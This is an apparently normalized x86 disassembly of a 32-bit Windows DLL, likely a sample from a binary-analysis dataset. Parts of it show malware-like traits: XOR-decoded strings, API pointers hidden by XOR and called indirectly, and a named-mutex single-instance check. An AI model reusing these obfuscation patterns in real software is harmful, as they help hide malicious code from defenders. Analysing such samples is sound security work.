lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_1001d099
add esp 0x18
push eax
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_10024441
fstp [ ebp - 0x54 ]
mov eax [ ebp - 0x48 ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
fld [ ebp - 0x54 ]
shl eax 0x2
push eax
push ecx
push ecx
fstp [ esp ]
call sub_100528c9
fstp [ ebp - 0x54 ]
add esp 0xc
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x4c ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x44 ] 0x0
jne r-xdata
fld [ ebp - 0x54 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn 0x20
sub_10059130
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov esi [ edi ]
test esi esi
je r-xdata
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov [ edi ] eax
test eax eax
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edi eax
mov eax 0x2
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov edi eax
mov [ esi + 0x4 ] eax
test edi edi
jne r-xdata
mov esi [ esi + 0x4 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
xor eax eax
mov ebx [ ebp + 0x8 ]
mov esi eax
call sub_1001b6d0
jmp r-xdata
push 0x58
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
lea eax [ edi + 0x1 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov [ edi + 0x4 ] 0x0
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn 0x4
mov [ edi ] eax
test eax eax
je r-xdata
sub_100591c1
push 0x14
mov eax sub_100854e5
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_100389e0
mov ecx [ ebp + 0x8 ]
push eax
call sub_100014d0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax edi
call sub_10013ab8
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10042de2
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10029420
push edi
call sub_10062b65
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1002c57b
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10024fe9
sub_1005925e
mov edi edi
push ebp
mov ebp esp
mov edx [ ecx + 0x10 ]
mov eax [ ebp + 0x8 ]
cmp eax edx
ja r-xdata
push [ ebp + 0xc ]
sub eax edx
push eax
call sub_1004ca10
push 0xffffffff
push eax
call sub_10021370
jmp r-xdata
pop ebp
retn 0x8
sub_10059290
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0xc ]
mov ecx esi
sub ecx eax
push ecx
push eax
push edx
call sub_1007f5d0
add esp 0xc
mov eax esi
pop esi
pop ebp
retn 0x10
sub_100592ca
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1001da0a
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x80
lea eax [ ebp - 0x10 ]
push eax
push 0x80
push [ ebp + 0x8 ]
call sub_100079d1
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_10059320
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100649b6
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
pop ecx
sub_10059350
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0x10 ]
push edi
push eax
push ecx
call sub_1003de13
mov esi eax
add esp 0xc
cmp esi edi
je r-xdata
pop edi
pop esi
pop ebp
retn 0x10
call sub_1006299d
mov edx [ eax ]
mov eax [ ebp + 0x14 ]
mov [ eax ] edx
mov eax esi
sub_10059390
push ebp
mov ebp esp
push esi
mov esi ecx
push edi
mov edi eax
cmp esi [ ebp + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebp
retn
add esi 0x10
push ebx
mov eax [ esi + 0xc ]
mov [ edi + 0x1c ] eax
mov ecx [ esi + 0x10 ]
add esi 0x24
mov [ edi + 0x20 ] ecx
lea edx [ esi - 0x10 ]
add edi 0x24
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov ebx 0x8
cmp [ edi + 0x14 ] ebx
jb r-xdata
lea eax [ esi - 0x10 ]
cmp edi eax
je r-xdata
mov eax edi
pop ebx
xor edx edx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] dx
cmp [ esi + 0x4 ] ebx
lea ebx [ esi - 0x10 ]
jae r-xdata
mov ecx [ edi ]
push ecx
call sub_100187af
add esp 0x4
mov edx [ ebx ]
mov [ edi ] edx
mov [ ebx ] 0x0
mov eax [ esi ]
lea ecx [ eax + eax + 0x2 ]
push ecx
push ebx
push edi
call sub_1007ec90
add esp 0xc
jmp r-xdata
mov eax [ esi ]
mov [ edi + 0x10 ] eax
mov ecx [ esi + 0x4 ]
mov [ edi + 0x14 ] ecx
xor edx edx
mov [ esi + 0x4 ] 0x7
mov [ esi ] 0x0
mov [ ebx ] dx
sub_10059450
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0xc ]
push edi
mov edi [ LocalFree@IAT ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
mov [ esi ] r--data
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call edi
test [ ebp + 0x8 ] 0x1
je r-xdata
push eax
call edi
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_100594b0
push ebp
mov ebp esp
push 0xffffffff
push sub_10088682
mov eax [ fs : 0x0 ]
push eax
sub esp 0x134
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x13c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x140 ] ecx
mov ecx [ r--data ]
mov [ ebp - 0x138 ] eax
movsx eax [ ecx ]
xor eax 0xff99
xor ecx ecx
and eax 0xff
mov [ ebp - 0x12c ] ax
mov [ ebp - 0x12a ] cx
mov ecx [ r--data ]
xor edi edi
xor eax eax
movsx esi [ ecx + eax ]
xor esi eax
xor esi 0x31
and esi 0xff
mov [ ebp + eax * 2 - 0x20 ] si
inc eax
cmp eax 0x2
jb r-xdata
xor eax eax
mov [ ebp - 0x1c ] ax
xor ecx ecx
mov eax edx
mov [ ebp - 0x88 ] 0x7
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x9c ] cx
lea esi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push edx
lea ecx [ ebp - 0x9c ]
call sub_1005ddc0
lea edx [ ebp - 0x9c ]
push edx
lea edx [ ebp - 0x12c ]
lea esi [ ebp - 0xf0 ]
mov [ ebp - 0x4 ] edi
call sub_1005bbc0
add esp 0x4
push eax
lea edx [ ebp - 0x20 ]
lea esi [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x1
call sub_1001ccb0
add esp 0x4
mov ebx 0x8
cmp [ ebp - 0xdc ] ebx
jb r-xdata
mov esi 0x7
xor ecx ecx
mov [ ebp - 0xdc ] esi
mov [ ebp - 0xe0 ] edi
mov [ ebp - 0xf0 ] cx
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x88 ] ebx
jb r-xdata
mov eax [ ebp - 0xf0 ]
push eax
call sub_100187af
add esp 0x4
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x88 ] esi
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x9c ] ax
lea ecx [ ecx ]
mov edx [ ebp - 0x9c ]
push edx
call sub_100187af
add esp 0x4
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffe5
and edx 0xff
mov [ ebp + eax * 2 - 0x80 ] dx
inc eax
cmp eax 0x2c
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x28 ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x67
and edx 0xff
mov [ ebp + eax * 2 - 0x18 ] dx
inc eax
cmp eax 0x2
jb r-xdata
lea ecx [ ebp - 0x18 ]
push ecx
lea edx [ ebp - 0x13c ]
xor eax eax
push edx
lea edx [ ebp - 0x80 ]
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x14 ] ax
call sub_100688b0
mov eax [ r--data ]
movsx ecx [ eax ]
mov eax [ r--data ]
xor ecx 0x37
and ecx 0xff
xor edx edx
mov [ ebp - 0x130 ] cx
mov [ ebp - 0x12e ] dx
movsx ecx [ eax ]
xor ecx 0x64
and ecx 0xff
add esp 0x8
xor eax eax
mov [ ebp - 0xc0 ] esi
mov esi [ ebp - 0x140 ]
mov [ ebp - 0xd4 ] ax
mov eax esi
mov [ ebp - 0x132 ] dx
mov [ ebp - 0x134 ] cx
mov [ ebp - 0xc4 ] edi
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0xd4 ]
call sub_1005ddc0
lea ecx [ ebp - 0xd4 ]
push ecx
lea edx [ ebp - 0x130 ]
lea esi [ ebp - 0x128 ]
mov [ ebp - 0x4 ] 0x5
call sub_1005bbc0
add esp 0x4
push eax
lea edx [ ebp - 0x134 ]
lea esi [ ebp - 0x10c ]
mov [ ebp - 0x4 ] 0x6
call sub_1001ccb0
add esp 0x4
push 0xffffffff
push edi
push eax
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x7
call sub_10017b50
cmp [ ebp - 0xf8 ] ebx
jb r-xdata
xor eax eax
mov esi 0x7
mov [ ebp - 0xf8 ] esi
mov [ ebp - 0xfc ] edi
mov [ ebp - 0x10c ] ax
cmp [ ebp - 0x114 ] ebx
jb r-xdata
mov edx [ ebp - 0x10c ]
push edx
call sub_100187af
add esp 0x4
xor edx edx
mov [ ebp - 0x114 ] esi
mov [ ebp - 0x118 ] edi
mov [ ebp - 0x128 ] dx
cmp [ ebp - 0xc0 ] ebx
jb r-xdata
mov ecx [ ebp - 0x128 ]
push ecx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0xb8 ]
cmp [ ebp - 0xa4 ] ebx
jae r-xdata
mov eax [ ebp - 0xd4 ]
push eax
call sub_100187af
add esp 0x4
mov edx [ ebp - 0x138 ]
call sub_10046fd0
mov esi eax
cmp [ ebp - 0xa4 ] ebx
jb r-xdata
lea ecx [ ebp - 0xb8 ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xb8 ]
push ecx
call sub_100187af
add esp 0x4
sub_10059830
push ebp
mov ebp esp
push 0xffffffff
push sub_10088722
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ edi + 0x4 ]
cmp esi ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax esi
ja r-xdata
mov ebx [ edi + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
xor eax eax
mov [ ebp - 0x4 ] 0x1
cmp ebx eax
je r-xdata
mov ecx edi
call sub_10069df0
sub esi eax
mov eax 0x38e38e39
imul esi
sar edx 0x3
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x24
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
mov [ ebx + 0x14 ] 0x7
mov [ ebx + 0x10 ] eax
push esi
mov ecx ebx
mov [ ebx ] dx
call sub_100649e0
mov eax [ esi + 0x1c ]
mov [ ebx + 0x1c ] eax
mov ecx [ esi + 0x20 ]
mov [ ebx + 0x20 ] ecx
mov ecx [ edi ]
lea eax [ esi + esi * 8 ]
mov esi [ edi + 0x4 ]
lea ebx [ ecx + eax * 4 ]
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] esi
xor eax eax
mov [ ebp - 0x4 ] eax
cmp esi eax
je r-xdata
mov ecx edi
call sub_10069df0
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push ebx
mov ecx esi
mov [ esi ] dx
call sub_100649e0
mov eax [ ebx + 0x1c ]
mov [ esi + 0x1c ] eax
mov ecx [ ebx + 0x20 ]
mov [ esi + 0x20 ] ecx
jmp r-xdata
sub_10059920
push ebp
mov ebp esp
push ebx
mov ebx [ ecx ]
push esi
mov esi [ ecx + 0x4 ]
sub esi ebx
mov eax 0x92492493
imul esi
mov eax [ ebp + 0x8 ]
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
mov edx 0x9249249
sub edx eax
push edi
cmp edx esi
jae r-xdata
mov edi [ ecx + 0x8 ]
add esi eax
sub edi ebx
mov eax 0x92492493
imul edi
add edx edi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jbe r-xdata
push r--data
call sub_1000831a
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx eax
shr edx 0x1
mov edi 0x9249249
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
xor eax eax
jmp r-xdata
push eax
call sub_1001c4c0
mov eax esi
cmp eax esi
jae r-xdata
sub_100599a0
push ebp
mov ebp esp
sub esp 0x8
mov edx [ rw-data ]
mov eax [ edx + 0x10 ]
push ebx
push esi
lea esi [ edx + 0xc ]
push edi
mov edi [ edx + 0x8 ]
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] 0x0
cmp ecx eax
jae r-xdata
cmp eax [ esi + 0x8 ]
jne r-xdata
mov ecx [ esi ]
lea ebx [ ebp - 0x8 ]
cmp ecx ebx
ja r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx esi
call sub_1005b9f0
mov edx [ rw-data ]
mov edi ebx
sub edi ecx
sar edi 0x3
cmp eax [ esi + 0x8 ]
jne r-xdata
add [ esi + 0x4 ] 0x8
mov eax [ edx + 0x8 ]
pop edi
lea ecx [ eax + 0x1 ]
pop esi
mov [ edx + 0x8 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov [ eax ] edi
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx esi
call sub_1005b9f0
mov edx [ rw-data ]
mov ecx [ esi ]
mov ebx [ ecx + edi * 8 ]
mov [ eax ] ebx
mov ecx [ ecx + edi * 8 + 0x4 ]
jmp r-xdata
mov [ eax + 0x4 ] ecx
sub_10059a40
push ebp
mov ebp esp
push 0xffffffff
push sub_1008643b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test eax eax
je r-xdata
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push 0x10
call sub_1001f84c
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] ebx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_1001c8b0
add eax 0x1c
mov eax ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ ecx ] esi
test bl 0x1
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100120f0
mov ebx 0x1
mov [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_10059d69
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_10059b00
mov eax [ esi + 0x24 ]
push ebx
xor ebx ebx
cmp eax ebx
je r-xdata
mov eax [ esi + 0x34 ]
cmp eax ebx
je r-xdata
cmp [ esi ] 0x1
jne r-xdata
mov [ esi + 0x34 ] ebx
mov [ esi + 0x38 ] ebx
mov [ esi + 0x3c ] ebx
cmp [ esi + 0x1c ] 0x10
jb r-xdata
push eax
call sub_100187af
add esp 0x4
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ esi + 0x1c ] 0xf
mov [ esi + 0x18 ] ebx
push esi
mov [ esi + 0x8 ] bl
call sub_100187af
add esp 0x4
mov eax esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
call sub_100187af
add esp 0x4
sub_10059b63
push 0x8
push r--data
call sub_1007fb20
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_1007fb65
retn
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push eax
push [ ecx + 0x18 ]
call sub_10035c5d
mov [ ebp - 0x4 ] 0xfffffffe
sub_10059bb8
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
xor eax eax
test ecx ecx
je r-xdata
leave
retn
cmp ecx 0x7fffffff
ja r-xdata
and [ ebp + 0x8 ] 0x0
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_10069ac6
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_10024fe9
lea eax [ ecx + ecx ]
push eax
call sub_1001f84c
pop ecx
test eax eax
jne r-xdata
sub_10059c06
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10048ac0
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
pop ecx
sub_10059c40
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
cmp [ eax + 0x104 ] edx
jbe r-xdata
pop ebp
retn 0x8
push ebx
push esi
pop esi
pop ebx
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
cmp eax r--data
jne r-xdata
inc eax
cmp eax r--data
jne r-xdata
mov cl [ eax + edx ]
mov eax r--data
movsx esi cl
mov edi edi
sub eax [ ebp + 0xc ]
sub eax r--data
and eax 0x3f
mov al [ eax + r--data ]
mov al cl
jmp r-xdata
movzx ebx [ eax ]
cmp ebx esi
je r-xdata
mov al cl
jmp r-xdata
mov ecx edi
mov ecx [ edi ]
jmp r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
cmp edx [ edi + 0x10 ]
jae r-xdata
mov [ ecx + edx ] al
mov ecx [ ebp + 0x8 ]
inc edx
cmp edx [ ecx + 0x104 ]
jb r-xdata
sub_10059cc0
push 0x28
mov eax sub_100851bd
call sub_100624bc
and [ ebp - 0x10 ] 0x0
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
push 0x4
pop eax
call sub_10013ab8
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x18
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x34 ]
call sub_1001c8b0
push ecx
lea ecx [ ebp - 0x34 ]
call sub_100120f0
and [ esi + 0x4 ] 0x0
xor ecx ecx
inc ecx
mov [ ebp - 0x10 ] ecx
push ecx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
call sub_1003f5f7
jmp r-xdata
lea ecx [ eax + 0x1c ]
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
sub_10059d80
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_10014506
mov [ esi ] al
inc esi
add esp 0x8
cmp esi ebx
jne r-xdata
pop edi
sub_10059dd7
push 0xc
push r--data
call sub_1007fb20
call sub_10044649
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_10058c10
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10059e72
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_1007fb65
retn
push 0x20
call sub_1003ca39
cmp esi rw-data
je r-xdata
push esi
call sub_10035d06
pop ecx
sub_10059ea0
push ebp
mov ebp esp
sub esp 0x14
mov ecx [ ebp + 0x8 ]
mov edx [ rw-data ]
push ebx
push esi
xor eax eax
mov bl 0x38
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push eax
mov [ ebp - 0x8 ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
xor [ ebp - 0x4 ] bl
xor [ ebp - 0x3 ] bl
xor [ ebp - 0x2 ] bl
xor [ ebp - 0x1 ] bl
push eax
lea edx [ ebp - 0x14 ]
push edx
push ecx
push eax
push eax
mov [ ebp - 0x14 ] 0xd
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
call [ ebp - 0x4 ]
mov edx [ rw-data ]
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
mov esi eax
push 0xffffffff
push esi
call [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push esi
call [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov edx [ ebp - 0x10 ]
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push edx
call [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_10059f54
push 0x8
mov eax sub_1008548c
call sub_10013486
mov esi ecx
mov [ ebp - 0x14 ] esi
call sub_10059d69
mov ecx [ ebp + 0x8 ]
lea edi [ esi + 0x14 ]
xor ebx ebx
push edi
push ebx
mov [ edi ] eax
mov [ edi + 0x4 ] edx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ ebp - 0x4 ] ebx
call sub_1004a031
push eax
call sub_10017f00
mov ecx [ ebp + 0x8 ]
add esp 0xc
push edi
push ebx
mov [ esi + 0x8 ] eax
call sub_1000c356
push eax
call sub_10017f00
add esp 0xc
mov [ esi + 0xc ] eax
call sub_10005db3
mov [ esi + 0x10 ] eax
call sub_10013ab8
retn 0x4
sub_10059fdf
push 0x14
mov eax sub_100854e5
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_100389e0
mov ecx [ ebp + 0x8 ]
push eax
call sub_100014d0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax edi
call sub_10013ab8
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100094d8
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10029420
push edi
call sub_10062b65
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1002c57b
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10024fe9
sub_1005a080
push ebp
mov ebp esp
push 0xffffffff
push sub_10088536
mov eax [ fs : 0x0 ]
push eax
sub esp 0x248
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ r--data ]
mov edi ecx
movsx ecx [ eax ]
xor ecx 0x4e
and ecx 0xff
lea eax [ ebp - 0x254 ]
push eax
xor edx edx
mov [ ebp - 0x254 ] cx
mov ecx eax
push ecx
mov [ ebp - 0x252 ] dx
mov edx eax
mov eax [ rw-data ]
push edx
push 0x0
push 0x1
push eax
lea eax [ ebp - 0x218 ]
call sub_10066ff0
test eax eax
je r-xdata
xor ecx ecx
push 0x4
mov [ ebp - 0x234 ] cx
push r--data
lea ecx [ ebp - 0x234 ]
mov [ ebp - 0x220 ] 0x7
mov [ ebp - 0x224 ] 0x0
call sub_1005ddc0
lea edx [ ebp - 0x234 ]
push edx
lea edx [ ebp - 0x218 ]
lea esi [ ebp - 0x250 ]
mov [ ebp - 0x4 ] 0x0
call sub_1005bbc0
add esp 0x4
push eax
lea ecx [ edi + 0x70 ]
mov [ ebp - 0x4 ] 0x1
call sub_100649e0
mov esi 0x8
cmp [ ebp - 0x23c ] esi
jb r-xdata
mov eax 0x1
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x23c ] 0x7
mov [ ebp - 0x240 ] 0x0
mov [ ebp - 0x250 ] cx
cmp [ ebp - 0x220 ] esi
jb r-xdata
mov eax [ ebp - 0x250 ]
push eax
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
xor eax eax
mov edx [ ebp - 0x234 ]
push edx
call sub_100187af
add esp 0x4
sub_1005a1d0
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff84
and edx 0xff
mov [ ebp + eax * 2 - 0x1c ] dx
inc eax
cmp eax 0xa
jb r-xdata
xor eax eax
lea ecx [ ebp - 0x1c ]
push ecx
push eax
push eax
mov [ ebp - 0x8 ] ax
call [ CreateMutexW@IAT ]
mov [ esi + 0x20 ] eax
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0xb7
jne r-xdata
lea edx [ ebp - 0x44 ]
mov eax 0x39
call sub_10053240
mov eax 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
